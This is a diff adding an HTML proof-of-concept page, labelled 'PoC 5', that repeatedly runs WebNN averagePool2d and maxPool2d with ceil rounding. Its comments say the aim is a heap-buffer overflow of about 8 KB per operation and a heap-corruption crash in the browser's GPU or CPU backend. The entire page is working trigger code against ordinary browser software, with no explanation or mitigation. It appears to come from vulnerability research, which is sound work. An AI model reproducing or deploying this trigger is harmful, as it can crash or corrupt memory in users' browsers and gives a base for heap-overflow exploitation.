@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head><title>WebNN pool2d ceil rounding - Crash Trigger</title></head>
+<body>
+<h2>WebNN pool2d ceil rounding - Crash Trigger (Repeated Overflow)</h2>
+<pre id="output"></pre>
+<script>
+const log = (msg) => {
+  console.log(msg);
+  document.getElementById('output').textContent += msg + '\n';
+};
+
+async function crashTrigger() {
+  log('=== PoC 5: Crash trigger - repeated pool2d with ceil mismatch ===');
+  log('Running many iterations to trigger heap corruption crash');
+  log('');
+
+  if (!navigator.ml) {
+    log('ERROR: WebNN API not available');
+    return;
+  }
+
+  let context;
+  try {
+    context = await navigator.ml.createContext({ deviceType: 'gpu' });
+    log('Using GPU/CoreML backend');
+  } catch(e) {
+    try {
+      context = await navigator.ml.createContext({ deviceType: 'cpu' });
+      log('Using CPU backend');
+    } catch(e2) {
+      log('No context: ' + e2.message);
+      return;
+    }
+  }
+
+  // Use shape that maximizes overflow per operation
+  // [1, 32, 63, 63], window [2,2], stride [2,2]
+  // Floor: 31x31 = 961 per channel, Ceil: 32x32 = 1024 per channel
+  // Overflow per op: (1024 - 961) * 32 * 4 = 8064 bytes
+  const shape = [1, 32, 63, 63];
+  const inputSize = 32 * 63 * 63;
+  const floorElements = 32 * 31 * 31;
+  const ceilElements = 32 * 32 * 32;
+
+  log(`Input: [${shape}]`);
+  log(`Floor output: ${floorElements} elements`);
+  log(`Ceil output: ${ceilElements} elements`);
+  log(`Overflow per iteration: ${(ceilElements - floorElements) * 4} bytes`);
+  log('');
+
+  const inputData = new Float32Array(inputSize);
+  for (let i = 0; i < inputSize; i++) inputData[i] = Math.random();
+
+  let crashDetected = false;
+  const iterations = 100;
+
+  for (let i = 0; i < iterations; i++) {
+    try {
+      const builder = new MLGraphBuilder(context);
+      const input = builder.input('input', { dataType: 'float32', shape: shape });
+
+      const pool = builder.averagePool2d(input, {
+        windowDimensions: [2, 2],
+        strides: [2, 2],
+        padding: [0, 0, 0, 0],
+        roundingType: 'ceil',
+        layout: 'nchw'
+      });
+
+      const graph = await builder.build({ 'out': pool });
+      const outputBuffer = new Float32Array(ceilElements);
+
+      const results = await context.compute(graph, { 'input': inputData }, { 'out': outputBuffer });
+      const output = results.outputs.out || outputBuffer;
+
+      if (i % 10 === 0) {
+        const nans = Array.from(output).filter(v => isNaN(v)).length;
+        const sentinels = Array.from(output).filter(v => v === 0).length;
+        log(`Iteration ${i}: len=${output.length}, zeros=${sentinels}, NaN=${nans}`);
+      }
+
+    } catch(e) {
+      log(`CRASH/ERROR at iteration ${i}: ${e.message}`);
+      crashDetected = true;
+      break;
+    }
+  }
+
+  if (!crashDetected) {
+    log(`Completed ${iterations} iterations without crash`);
+  }
+
+  // Now try maxPool2d with same parameters
+  log('');
+  log('--- maxPool2d stress test ---');
+  for (let i = 0; i < iterations; i++) {
+    try {
+      const builder = new MLGraphBuilder(context);
+      const input = builder.input('input', { dataType: 'float32', shape: shape });
+
+      const pool = builder.maxPool2d(input, {
+        windowDimensions: [2, 2],
+        strides: [2, 2],
+        padding: [0, 0, 0, 0],
+        roundingType: 'ceil',
+        layout: 'nchw'
+      });
+
+      const graph = await builder.build({ 'out': pool });
+      const outputBuffer = new Float32Array(ceilElements);
+
+      const results = await context.compute(graph, { 'input': inputData }, { 'out': outputBuffer });
+
+      if (i % 10 === 0) {
+        log(`maxPool iteration ${i}: OK`);
+      }
+
+    } catch(e) {
+      log(`maxPool CRASH/ERROR at iteration ${i}: ${e.message}`);
+      crashDetected = true;
+      break;
+    }
+  }
+
+  log('');
+  log(`=== PoC 5 Complete. Crash detected: ${crashDetected} ===`);
+}
+
+crashTrigger();
+</script>
+</body>
+</html>
